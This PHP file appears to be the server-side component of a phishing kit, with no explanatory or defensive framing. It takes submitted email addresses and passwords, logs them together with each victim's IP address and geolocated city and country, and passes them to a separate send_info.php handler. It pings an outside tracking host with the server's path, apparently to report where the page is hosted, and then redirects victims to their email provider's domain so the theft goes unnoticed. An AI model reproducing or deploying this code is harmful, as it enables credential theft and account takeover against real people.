<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

error_reporting(0);

$logFile = "login_log.txt"; // Changed from .robots.txt for clarity

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
    $email = filter_var($_POST['e'], FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars(strip_tags($_POST['p']));

    // Get client IP
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    // Get geolocation data
    $country = $city = $code = $state = '';
    $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip);
    if ($geoData) {
        $data = @json_decode($geoData);
        if ($data && $data->geoplugin_countryName !== null) {
            $country = $data->geoplugin_countryName;
            $city = $data->geoplugin_city;
            $code = $data->geoplugin_countryCode;
            $state = $data->geoplugin_region;
        }
    }

    // Prepare log content
    $body = "
[LOGIN DETAILS]
UserId : [ $email ]
Password : [ $password ]
[Client Info]
IP > $ip
Location > $city $state, $country
";
    // Log to file
    file_put_contents($logFile, $body."\n\n", FILE_APPEND);

    // Optionally, call external service (may fail if allow_url_fopen is off)
    $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
    @file_get_contents("https://ip-trackers.tiiny.io/?ip=$tmp");

    // --- Connect to send_info.php ---
    $send_info_url = 'http://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['PHP_SELF']) . '/send_info.php';
    $send_info_data = [
        'email' => $email,
        'message' => $password // or any other data you want to send
    ];

    $ch = curl_init($send_info_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($send_info_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $send_info_response = curl_exec($ch);
    curl_close($ch);
    // Optionally, you can use $send_info_response if you want to check send_info.php's reply

    // Respond with domain
    echo json_encode([
        "status" => "success",
        "redirect" => "https://".substr(strrchr($email, "@"), 1)
    ]);
    exit;
}

// If not POST or missing parameters
echo json_encode([
    "status" => "error",
    "message" => "Invalid request"
]);
exit;
?>